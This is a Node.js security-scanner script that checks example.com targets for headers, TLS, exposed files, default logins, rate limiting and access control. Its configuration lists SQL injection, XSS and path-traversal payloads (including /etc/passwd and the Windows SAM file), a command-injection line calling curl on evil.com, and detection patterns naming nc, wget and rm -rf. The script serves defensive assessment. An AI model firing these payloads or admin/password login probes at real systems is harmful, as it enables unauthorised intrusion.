#!/usr/bin/env node

/**
 * Cloudflare Security Posture Assessment Tool
 * Comprehensive security scanning for Cloudflare deployments
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');
const crypto = require('crypto');

// Security configuration
const SECURITY_CONFIG = {
    // Target configuration
    targets: [
        {
            name: 'Main Application',
            url: 'https://example.com',
            critical: true,
            scanTypes: ['headers', 'vulnerabilities', 'ssl', 'content']
        },
        {
            name: 'API Endpoint',
            url: 'https://api.example.com',
            critical: true,
            scanTypes: ['headers', 'vulnerabilities', 'auth', 'rate-limiting']
        },
        {
            name: 'Admin Panel',
            url: 'https://admin.example.com',
            critical: true,
            scanTypes: ['headers', 'vulnerabilities', 'auth', 'access-control']
        }
    ],

    // Security checks configuration
    checks: {
        // HTTP security headers
        headers: {
            required: [
                { name: 'X-Frame-Options', expected: 'DENY', severity: 'high' },
                { name: 'X-Content-Type-Options', expected: 'nosniff', severity: 'medium' },
                { name: 'X-XSS-Protection', expected: '1; mode=block', severity: 'high' },
                { name: 'Strict-Transport-Security', pattern: /^max-age=\d+/, severity: 'high' },
                { name: 'Content-Security-Policy', pattern: /default-src/, severity: 'medium' },
                { name: 'Referrer-Policy', expected: 'strict-origin-when-cross-origin', severity: 'low' }
            ],
            recommended: [
                { name: 'Permissions-Policy', severity: 'low' },
                { name: 'X-Permitted-Cross-Domain-Policies', severity: 'low' },
                { name: 'Expect-CT', severity: 'low' }
            ]
        },

        // SSL/TLS configuration
        ssl: {
            requiredProtocols: ['TLSv1.2', 'TLSv1.3'],
            disabledProtocols: ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1'],
            requiredCiphers: [
                'TLS_AES_128_GCM_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256'
            ],
            weakCiphers: [
                'RC4',
                'DES',
                'MD5',
                'NULL',
                'EXPORT',
                'ADH',
                'AECDH'
            ],
            certificateValidation: {
                checkExpiration: true,
                checkChain: true,
                checkRevocation: true,
                checkHostname: true,
                minKeySize: 2048
            }
        },

        // Common vulnerability checks
        vulnerabilities: {
            owasp: [
                { name: 'SQL Injection', patterns: [/union\s+select/i, /or\s+1\s*=\s*1/i, /drop\s+table/i], severity: 'critical' },
                { name: 'XSS', patterns: [/<script/i, /javascript:/i, /onerror\s*=/i, /onload\s*=/i], severity: 'high' },
                { name: 'Path Traversal', patterns: [/\/\.\./, /\.\.\\/, /%2e%2e%2f/i], severity: 'high' },
                { name: 'Command Injection', patterns: [/;\s*rm\s+-rf/i, /\|\s*nc\s+/i, /&&\s*wget/i], severity: 'critical' },
                { name: 'XXE', patterns: [/<\?xml.*<!DOCTYPE/i, /<!ENTITY.*SYSTEM/i], severity: 'high' },
                { name: 'SSRF', patterns: [/localhost/i, /127\.0\.0\.1/i, /192\.168\./i, /10\./i], severity: 'high' }
            ],
            informationDisclosure: [
                { name: 'Server Header', pattern: /server:/i, severity: 'low' },
                { name: 'X-Powered-By', pattern: /x-powered-by:/i, severity: 'low' },
                { name: 'ASP.NET Version', pattern: /x-aspnet-version/i, severity: 'low' },
                { name: 'PHP Version', pattern: /x-powered-by:\s*php/i, severity: 'low' }
            ],
            sensitiveFiles: [
                { name: 'Git Configuration', paths: ['/.git/config', '/.git/HEAD'], severity: 'medium' },
                { name: 'Environment Files', paths: ['/.env', '/.env.local'], severity: 'high' },
                { name: 'Backup Files', paths: ['/.backup', '/.bak', '/.old'], severity: 'medium' },
                { name: 'Config Files', paths: ['/wp-config.php', '/config.php', '/database.yml'], severity: 'high' },
                { name: 'Log Files', paths: ['/error.log', '/access.log'], severity: 'medium' }
            ]
        },

        // Authentication and authorization
        authentication: {
            checks: [
                { name: 'Default Credentials', severity: 'critical' },
                { name: 'Weak Password Policy', severity: 'high' },
                { name: 'Missing Rate Limiting', severity: 'medium' },
                { name: 'Insecure Session Management', severity: 'high' },
                { name: 'Missing CSRF Protection', severity: 'high' }
            ]
        },

        // Content security checks
        content: {
            checks: [
                { name: 'Inline Scripts', severity: 'medium' },
                { name: 'Inline Styles', severity: 'low' },
                { name: 'Mixed Content', severity: 'medium' },
                { name: 'External Resources', severity: 'low' },
                { name: 'Missing Integrity Attributes', severity: 'medium' }
            ]
        }
    },

    // Attack simulation configuration
    attackSimulation: {
        enabled: true,
        safeMode: true, // Only perform non-destructive tests
        payloads: {
            sql: ["'", "' OR '1'='1", "'; DROP TABLE users; --"],
            xss: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            path: ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
            command: ["; ls -la", "| whoami", "&& curl http://evil.com"]
        }
    },

    // Compliance frameworks
    compliance: {
        frameworks: ['OWASP', 'NIST', 'CIS'],
        levels: ['low', 'medium', 'high', 'critical']
    }
};

// Security scanner class
class SecurityScanner {
    constructor(config = {}) {
        this.config = { ...SECURITY_CONFIG, ...config };
        this.results = [];
        this.startTime = null;
        this.endTime = null;
    }

    /**
     * Run comprehensive security scan
     */
    async runScan() {
        console.log('🔒 Starting comprehensive security scan...');
        console.log(`🎯 Scanning ${this.config.targets.length} targets`);

        this.startTime = Date.now();

        try {
            // Scan each target
            for (const target of this.config.targets) {
                console.log(`\n🔍 Scanning target: ${target.name}`);
                await this.scanTarget(target);
            }

            // Analyze results
            this.analyzeResults();

            // Generate report
            this.generateReport();

            this.endTime = Date.now();

            console.log('\n✅ Security scan completed');
            console.log(`⏱️ Total scan duration: ${this.endTime - this.startTime}ms`);

            return this.getResults();

        } catch (error) {
            console.error('❌ Security scan failed:', error);
            throw error;
        }
    }

    /**
     * Scan a single target
     */
    async scanTarget(target) {
        const targetResult = {
            target: target.name,
            url: target.url,
            timestamp: new Date().toISOString(),
            scanTypes: target.scanTypes,
            results: {},
            summary: {
                critical: 0,
                high: 0,
                medium: 0,
                low: 0,
                totalIssues: 0
            }
        };

        // Perform different types of scans based on configuration
        for (const scanType of target.scanTypes) {
            console.log(`  📋 Running ${scanType} scan...`);

            try {
                switch (scanType) {
                    case 'headers':
                        targetResult.results.headers = await this.scanHeaders(target.url);
                        break;
                    case 'ssl':
                        targetResult.results.ssl = await this.scanSSL(target.url);
                        break;
                    case 'vulnerabilities':
                        targetResult.results.vulnerabilities = await this.scanVulnerabilities(target.url);
                        break;
                    case 'authentication':
                        targetResult.results.authentication = await this.scanAuthentication(target.url);
                        break;
                    case 'content':
                        targetResult.results.content = await this.scanContent(target.url);
                        break;
                    case 'rate-limiting':
                        targetResult.results.rateLimiting = await this.scanRateLimiting(target.url);
                        break;
                    case 'access-control':
                        targetResult.results.accessControl = await this.scanAccessControl(target.url);
                        break;
                }
            } catch (error) {
                console.error(`    ❌ ${scanType} scan failed:`, error.message);
                targetResult.results[scanType] = {
                    error: error.message,
                    issues: []
                };
            }
        }

        // Calculate summary
        this.calculateTargetSummary(targetResult);

        this.results.push(targetResult);
    }

    /**
     * Scan HTTP security headers
     */
    async scanHeaders(url) {
        const issues = [];
        const presentHeaders = {};

        try {
            const response = await this.makeRequest(url, 'HEAD');
            const headers = response.headers;

            // Check required headers
            for (const header of this.config.checks.headers.required) {
                const headerValue = headers[header.name.toLowerCase()];
                presentHeaders[header.name] = headerValue;

                if (!headerValue) {
                    issues.push({
                        type: 'missing_header',
                        severity: header.severity,
                        header: header.name,
                        message: `Missing security header: ${header.name}`
                    });
                } else {
                    // Check if header value meets expectations
                    if (header.expected && !headerValue.includes(header.expected)) {
                        issues.push({
                            type: 'weak_header',
                            severity: header.severity,
                            header: header.name,
                            currentValue: headerValue,
                            expectedValue: header.expected,
                            message: `Weak security header value for ${header.name}`
                        });
                    } else if (header.pattern && !header.pattern.test(headerValue)) {
                        issues.push({
                            type: 'weak_header',
                            severity: header.severity,
                            header: header.name,
                            currentValue: headerValue,
                            message: `Security header ${header.name} doesn't match expected pattern`
                        });
                    }
                }
            }

            // Check recommended headers
            for (const header of this.config.checks.headers.recommended) {
                const headerValue = headers[header.name.toLowerCase()];
                if (headerValue) {
                    presentHeaders[header.name] = headerValue;
                } else {
                    issues.push({
                        type: 'missing_recommended_header',
                        severity: header.severity,
                        header: header.name,
                        message: `Missing recommended security header: ${header.name}`
                    });
                }
            }

            return {
                success: true,
                headers: presentHeaders,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'scan_error',
                    severity: 'medium',
                    message: `Failed to scan headers: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan SSL/TLS configuration
     */
    async scanSSL(url) {
        const issues = [];
        const sslInfo = {};

        try {
            const urlObj = new URL(url);
            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port || 443,
                rejectUnauthorized: false
            };

            const socket = require('tls').connect(options, () => {
                sslInfo.protocol = socket.getProtocol();
                sslInfo.cipher = socket.getCipher();
                sslInfo.certificate = socket.getPeerCertificate(true);

                // Check protocol version
                if (!this.config.checks.ssl.requiredProtocols.includes(sslInfo.protocol)) {
                    issues.push({
                        type: 'weak_protocol',
                        severity: 'high',
                        protocol: sslInfo.protocol,
                        message: `Weak SSL/TLS protocol: ${sslInfo.protocol}`
                    });
                }

                // Check cipher strength
                if (this.config.checks.ssl.weakCiphers.some(weak => sslInfo.cipher.name.includes(weak))) {
                    issues.push({
                        type: 'weak_cipher',
                        severity: 'high',
                        cipher: sslInfo.cipher.name,
                        message: `Weak cipher suite: ${sslInfo.cipher.name}`
                    });
                }

                // Check certificate validity
                if (sslInfo.certificate) {
                    const cert = sslInfo.certificate;
                    const now = new Date();
                    const expiryDate = new Date(cert.valid_to);
                    const daysUntilExpiry = Math.floor((expiryDate - now) / (1000 * 60 * 60 * 24));

                    if (daysUntilExpiry < 30) {
                        issues.push({
                            type: 'certificate_expiring',
                            severity: daysUntilExpiry < 7 ? 'critical' : 'high',
                            daysUntilExpiry,
                            message: `SSL certificate expires in ${daysUntilExpiry} days`
                        });
                    }

                    // Check key size
                    if (cert.bits && cert.bits < this.config.checks.ssl.certificateValidation.minKeySize) {
                        issues.push({
                            type: 'weak_certificate_key',
                            severity: 'medium',
                            keySize: cert.bits,
                            message: `SSL certificate key size too small: ${cert.bits} bits`
                        });
                    }
                }

                socket.end();
            });

            socket.on('error', (error) => {
                issues.push({
                    type: 'ssl_connection_error',
                    severity: 'high',
                    message: `SSL connection error: ${error.message}`
                });
            });

            await new Promise((resolve, reject) => {
                socket.on('end', resolve);
                socket.on('error', reject);
            });

            return {
                success: true,
                sslInfo,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'ssl_scan_error',
                    severity: 'high',
                    message: `Failed to scan SSL: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan for common vulnerabilities
     */
    async scanVulnerabilities(url) {
        const issues = [];

        try {
            // Get initial response
            const response = await this.makeRequest(url);
            const content = response.data;

            // Check OWASP vulnerabilities in content
            for (const vuln of this.config.checks.vulnerabilities.owasp) {
                for (const pattern of vuln.patterns) {
                    if (pattern.test(content)) {
                        issues.push({
                            type: 'vulnerability',
                            severity: vuln.severity,
                            vulnerability: vuln.name,
                            pattern: pattern.source,
                            message: `Potential ${vuln.name} vulnerability detected`
                        });
                    }
                }
            }

            // Check for information disclosure
            for (const disc of this.config.checks.vulnerabilities.informationDisclosure) {
                if (disc.pattern.test(response.headersRaw)) {
                    issues.push({
                        type: 'information_disclosure',
                        severity: disc.severity,
                        disclosure: disc.name,
                        message: `Information disclosure: ${disc.name}`
                    });
                }
            }

            // Check for sensitive files (if attack simulation is enabled)
            if (this.config.attackSimulation.enabled) {
                for (const file of this.config.checks.vulnerabilities.sensitiveFiles) {
                    for (const path of file.paths) {
                        try {
                            const fileUrl = new URL(path, url).toString();
                            const fileResponse = await this.makeRequest(fileUrl);

                            if (fileResponse.statusCode === 200) {
                                issues.push({
                                    type: 'sensitive_file_exposed',
                                    severity: file.severity,
                                    file: path,
                                    message: `Sensitive file exposed: ${path}`
                                });
                            }
                        } catch (error) {
                            // File not found is expected
                        }
                    }
                }
            }

            return {
                success: true,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'vulnerability_scan_error',
                    severity: 'medium',
                    message: `Failed to scan vulnerabilities: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan authentication mechanisms
     */
    async scanAuthentication(url) {
        const issues = [];

        try {
            // Check for login endpoints
            const loginEndpoints = ['/login', '/auth', '/signin', '/api/login', '/api/auth'];

            for (const endpoint of loginEndpoints) {
                try {
                    const loginUrl = new URL(endpoint, url).toString();
                    const response = await this.makeRequest(loginUrl, 'POST', {
                        username: 'admin',
                        password: 'password'
                    });

                    // Check for default credentials
                    if (response.statusCode === 200 || response.statusCode === 302) {
                        issues.push({
                            type: 'weak_authentication',
                            severity: 'high',
                            endpoint: endpoint,
                            message: `Possible default credentials vulnerability at ${endpoint}`
                        });
                    }
                } catch (error) {
                    // Expected for non-existent endpoints
                }
            }

            // Check session management
            const authResponse = await this.makeRequest(url);
            const setCookieHeaders = authResponse.headers['set-cookie'];

            if (setCookieHeaders) {
                for (const cookie of setCookieHeaders) {
                    if (!cookie.includes('HttpOnly')) {
                        issues.push({
                            type: 'insecure_session',
                            severity: 'medium',
                            cookie: cookie,
                            message: 'Session cookie missing HttpOnly flag'
                        });
                    }

                    if (!cookie.includes('Secure') && url.startsWith('https://')) {
                        issues.push({
                            type: 'insecure_session',
                            severity: 'medium',
                            cookie: cookie,
                            message: 'Session cookie missing Secure flag'
                        });
                    }

                    if (cookie.includes('SameSite=') && !cookie.includes('SameSite=Strict') && !cookie.includes('SameSite=Lax')) {
                        issues.push({
                            type: 'insecure_session',
                            severity: 'low',
                            cookie: cookie,
                            message: 'Session cookie using weak SameSite policy'
                        });
                    }
                }
            }

            return {
                success: true,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'auth_scan_error',
                    severity: 'medium',
                    message: `Failed to scan authentication: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan content security
     */
    async scanContent(url) {
        const issues = [];

        try {
            const response = await this.makeRequest(url);
            const content = response.data;

            // Check for inline scripts
            if (/<script[^>]*>[^<]*(?:(?!<\/script>)[^<])*<\/script>/gi.test(content)) {
                const inlineScripts = content.match(/<script[^>]*>[^<]*<\/script>/gi);
                if (inlineScripts && inlineScripts.some(script => !script.includes('integrity'))) {
                    issues.push({
                        type: 'insecure_content',
                        severity: 'medium',
                        contentType: 'inline_script',
                        message: 'Inline scripts detected without integrity attributes'
                    });
                }
            }

            // Check for inline styles
            if (/<style[^>]*>[^<]*<\/style>/gi.test(content)) {
                issues.push({
                    type: 'insecure_content',
                    severity: 'low',
                    contentType: 'inline_style',
                    message: 'Inline styles detected'
                });
            }

            // Check for mixed content
            const httpsUrl = url.startsWith('https://');
            if (httpsUrl && /http:\/\//gi.test(content)) {
                issues.push({
                    type: 'mixed_content',
                    severity: 'medium',
                    message: 'Mixed content detected: HTTP resources on HTTPS page'
                });
            }

            // Check external resource security
            const externalResources = content.match(/(?:src|href)=["'](http[^"']+)["']/gi);
            if (externalResources) {
                externalResources.forEach(resource => {
                    const resourceUrl = resource.match(/["'](http[^"']+)["']/)[1];
                    if (resourceUrl && resourceUrl.startsWith('http://')) {
                        issues.push({
                            type: 'insecure_external_resource',
                            severity: 'low',
                            resource: resourceUrl,
                            message: 'Insecure external resource (HTTP) detected'
                        });
                    }
                });
            }

            return {
                success: true,
                contentLength: content.length,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'content_scan_error',
                    severity: 'medium',
                    message: `Failed to scan content: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan rate limiting
     */
    async scanRateLimiting(url) {
        const issues = [];

        try {
            // Make rapid requests to test rate limiting
            const requests = [];
            const requestCount = 20;
            const requestDelay = 100; // ms

            for (let i = 0; i < requestCount; i++) {
                requests.push(
                    new Promise(resolve => {
                        setTimeout(() => {
                            this.makeRequest(url).then(resolve).catch(resolve);
                        }, i * requestDelay);
                    })
                );
            }

            const responses = await Promise.allSettled(requests);
            const successCount = responses.filter(r => r.status === 'fulfilled' && r.value.statusCode < 400).length;

            // If more than 90% of requests succeed, rate limiting might be missing or too lenient
            if (successCount / requestCount > 0.9) {
                issues.push({
                    type: 'missing_rate_limit',
                    severity: 'medium',
                    successRate: (successCount / requestCount) * 100,
                    message: `No rate limiting detected (${successCount}/${requestCount} requests succeeded)`
                });
            }

            return {
                success: true,
                requestsTested: requestCount,
                successfulRequests: successCount,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'rate_limit_scan_error',
                    severity: 'medium',
                    message: `Failed to scan rate limiting: ${error.message}`
                }]
            };
        }
    }

    /**
     * Scan access control
     */
    async scanAccessControl(url) {
        const issues = [];

        try {
            // Test for directory traversal
            const traversalPaths = [
                '/admin/config',
                '/admin/users',
                '/api/admin',
                '/backup',
                '/logs'
            ];

            for (const path of traversalPaths) {
                try {
                    const testUrl = new URL(path, url).toString();
                    const response = await this.makeRequest(testUrl);

                    // If restricted endpoints are accessible without authentication
                    if (response.statusCode === 200) {
                        issues.push({
                            type: 'broken_access_control',
                            severity: 'high',
                            path: path,
                            message: `Restricted endpoint accessible without authentication: ${path}`
                        });
                    }
                } catch (error) {
                    // Expected for properly secured endpoints
                }
            }

            return {
                success: true,
                issues
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                issues: [{
                    type: 'access_control_scan_error',
                    severity: 'medium',
                    message: `Failed to scan access control: ${error.message}`
                }]
            };
        }
    }

    /**
     * Make HTTP request
     */
    async makeRequest(url, method = 'GET', data = null, headers = {}) {
        const urlObj = new URL(url);
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: method,
            headers: {
                'User-Agent': 'Cloudflare-SecurityScanner/1.0',
                'Accept': '*/*',
                ...headers
            },
            timeout: 10000
        };

        if (data) {
            data = typeof data === 'object' ? JSON.stringify(data) : data;
            options.headers['Content-Type'] = 'application/json';
            options.headers['Content-Length'] = Buffer.byteLength(data);
        }

        const client = urlObj.protocol === 'https:' ? https : http;

        return new Promise((resolve, reject) => {
            const req = client.request(options, (res) => {
                let responseData = '';
                const headersRaw = Object.keys(res.headers).map(key => `${key}: ${res.headers[key]}`).join('\n');

                res.on('data', chunk => {
                    responseData += chunk;
                });

                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        headersRaw: headersRaw,
                        data: responseData
                    });
                });
            });

            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            if (data) {
                req.write(data);
            }

            req.end();
        });
    }

    /**
     * Calculate summary for target results
     */
    calculateTargetSummary(targetResult) {
        const summary = targetResult.summary;

        Object.values(targetResult.results).forEach(result => {
            if (result && result.issues) {
                result.issues.forEach(issue => {
                    const severity = issue.severity || 'medium';
                    if (summary[severity] !== undefined) {
                        summary[severity]++;
                        summary.totalIssues++;
                    }
                });
            }
        });
    }

    /**
     * Analyze overall results
     */
    analyzeResults() {
        console.log('\n📊 Analyzing security scan results...');

        const overallSummary = {
            critical: 0,
            high: 0,
            medium: 0,
            low: 0,
            totalIssues: 0,
            targetsScanned: this.results.length,
            scanDuration: this.endTime - this.startTime
        };

        this.results.forEach(targetResult => {
            const summary = targetResult.summary;
            overallSummary.critical += summary.critical;
            overallSummary.high += summary.high;
            overallSummary.medium += summary.medium;
            overallSummary.low += summary.low;
            overallSummary.totalIssues += summary.totalIssues;
        });

        console.log(`🔍 Security Scan Summary:`);
        console.log(`  Critical Issues: ${overallSummary.critical}`);
        console.log(`  High Issues: ${overallSummary.high}`);
        console.log(`  Medium Issues: ${overallSummary.medium}`);
        console.log(`  Low Issues: ${overallSummary.low}`);
        console.log(`  Total Issues: ${overallSummary.totalIssues}`);
        console.log(`  Targets Scanned: ${overallSummary.targetsScanned}`);
        console.log(`  Scan Duration: ${overallSummary.scanDuration}ms`);

        // Risk assessment
        const riskScore = this.calculateRiskScore(overallSummary);
        console.log(`  Risk Score: ${riskScore}/100 (${this.getRiskLevel(riskScore)})`);

        this.overallSummary = overallSummary;
        this.riskScore = riskScore;
    }

    /**
     * Calculate risk score
     */
    calculateRiskScore(summary) {
        const weights = {
            critical: 25,
            high: 15,
            medium: 5,
            low: 1
        };

        const totalScore = (summary.critical * weights.critical) +
                           (summary.high * weights.high) +
                           (summary.medium * weights.medium) +
                           (summary.low * weights.low);

        // Cap at 100
        return Math.min(100, totalScore);
    }

    /**
     * Get risk level from score
     */
    getRiskLevel(score) {
        if (score >= 80) return 'Critical';
        if (score >= 60) return 'High';
        if (score >= 40) return 'Medium';
        if (score >= 20) return 'Low';
        return 'Minimal';
    }

    /**
     * Generate security report
     */
    generateReport() {
        const report = {
            timestamp: new Date().toISOString(),
            summary: this.overallSummary,
            riskScore: this.riskScore,
            targets: this.results,
            configuration: this.config,
            recommendations: this.generateRecommendations()
        };

        // Save report to file
        const fs = require('fs');
        const reportPath = `./security-report-${Date.now()}.json`;
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

        console.log(`\n📋 Security report saved to: ${reportPath}`);

        // Generate summary report
        this.generateSummaryReport(report);
    }

    /**
     * Generate human-readable summary report
     */
    generateSummaryReport(report) {
        console.log('\n📄 Security Scan Summary Report');
        console.log('='.repeat(50));

        // Risk assessment
        console.log(`\n🎯 Risk Assessment:`);
        console.log(`  Overall Risk Score: ${report.riskScore}/100 (${this.getRiskLevel(report.riskScore)})`);
        console.log(`  Critical Issues: ${report.summary.critical}`);
        console.log(`  High Issues: ${report.summary.high}`);
        console.log(`  Medium Issues: ${report.summary.medium}`);
        console.log(`  Low Issues: ${report.summary.low}`);

        // Target-specific issues
        console.log('\n🎯 Target Security Issues:');
        report.targets.forEach(target => {
            const totalIssues = target.summary.totalIssues;
            const criticalIssues = target.summary.critical;
            const highIssues = target.summary.high;

            let status = '✅';
            if (criticalIssues > 0) status = '🚨';
            else if (highIssues > 0) status = '⚠️';
            else if (totalIssues > 0) status = '🔍';

            console.log(`  ${status} ${target.target}: ${totalIssues} issues (${criticalIssues} critical, ${highIssues} high)`);
        });

        // Critical issues
        const criticalIssues = [];
        report.targets.forEach(target => {
            Object.values(target.results).forEach(result => {
                if (result && result.issues) {
                    result.issues
                        .filter(issue => issue.severity === 'critical')
                        .forEach(issue => {
                            criticalIssues.push({
                                target: target.target,
                                ...issue
                            });
                        });
                }
            });
        });

        if (criticalIssues.length > 0) {
            console.log('\n🚨 Critical Issues:');
            criticalIssues.forEach(issue => {
                console.log(`  • ${issue.target}: ${issue.message}`);
            });
        }

        // Recommendations
        if (report.recommendations.length > 0) {
            console.log('\n💡 Security Recommendations:');
            report.recommendations.forEach(rec => {
                console.log(`  • ${rec}`);
            });
        }
    }

    /**
     * Generate security recommendations
     */
    generateRecommendations() {
        const recommendations = [];
        const summary = this.overallSummary;

        if (summary.critical > 0) {
            recommendations.push('Immediately address all critical security vulnerabilities');
        }

        if (summary.high > 0) {
            recommendations.push('Prioritize fixing high-severity security issues');
        }

        // Check for missing headers across all targets
        const headerIssues = new Set();
        this.results.forEach(target => {
            if (target.results.headers && target.results.headers.issues) {
                target.results.headers.issues
                    .filter(issue => issue.type === 'missing_header')
                    .forEach(issue => headerIssues.add(issue.header));
            }
        });

        if (headerIssues.size > 0) {
            recommendations.push(`Implement missing security headers: ${Array.from(headerIssues).join(', ')}`);
        }

        // Check SSL issues
        const sslIssues = [];
        this.results.forEach(target => {
            if (target.results.ssl && target.results.ssl.issues) {
                sslIssues.push(...target.results.ssl.issues);
            }
        });

        if (sslIssues.some(issue => issue.type === 'weak_protocol' || issue.type === 'weak_cipher')) {
            recommendations.push('Upgrade SSL/TLS configuration to use strong protocols and ciphers');
        }

        if (sslIssues.some(issue => issue.type === 'certificate_expiring')) {
            recommendations.push('Renew SSL certificates before they expire');
        }

        // Check for authentication issues
        const authIssues = [];
        this.results.forEach(target => {
            if (target.results.authentication && target.results.authentication.issues) {
                authIssues.push(...target.results.authentication.issues);
            }
        });

        if (authIssues.some(issue => issue.type === 'weak_authentication')) {
            recommendations.push('Implement strong authentication mechanisms and remove default credentials');
        }

        if (authIssues.some(issue => issue.type === 'insecure_session')) {
            recommendations.push('Implement secure session management with HttpOnly, Secure, and SameSite flags');
        }

        return recommendations;
    }

    /**
     * Get scan results
     */
    getResults() {
        return {
            config: this.config,
            results: this.results,
            summary: this.overallSummary,
            riskScore: this.riskScore,
            duration: this.endTime - this.startTime,
            timestamp: new Date().toISOString()
        };
    }
}

// CLI interface
if (require.main === module) {
    const args = process.argv.slice(2);
    let config = {};

    // Parse command line arguments
    for (let i = 0; i < args.length; i += 2) {
        if (args[i] === '--targets') {
            try {
                config.targets = JSON.parse(args[i + 1]);
            } catch (e) {
                console.error('Invalid targets JSON format');
                process.exit(1);
            }
        } else if (args[i] === '--output') {
            config.outputFile = args[i + 1];
        } else if (args[i] === '--safe-mode') {
            config.attackSimulation = {
                ...SECURITY_CONFIG.attackSimulation,
                safeMode: args[i + 1] !== 'false'
            };
        }
    }

    // Run security scan
    const scanner = new SecurityScanner(config);

    scanner.runScan()
        .then(results => {
            if (config.outputFile) {
                const fs = require('fs');
                fs.writeFileSync(config.outputFile, JSON.stringify(results, null, 2));
                console.log(`\n📁 Results saved to: ${config.outputFile}`);
            }

            // Exit with appropriate code based on security posture
            if (results.riskScore >= 80) {
                process.exit(1); // Critical security issues
            } else if (results.riskScore >= 60) {
                process.exit(2); // High security risk
            } else if (results.riskScore >= 40) {
                process.exit(3); // Medium security risk
            } else {
                process.exit(0); // Good security posture
            }
        })
        .catch(error => {
            console.error('Security scan failed:', error);
            process.exit(1);
        });
}

module.exports = SecurityScanner;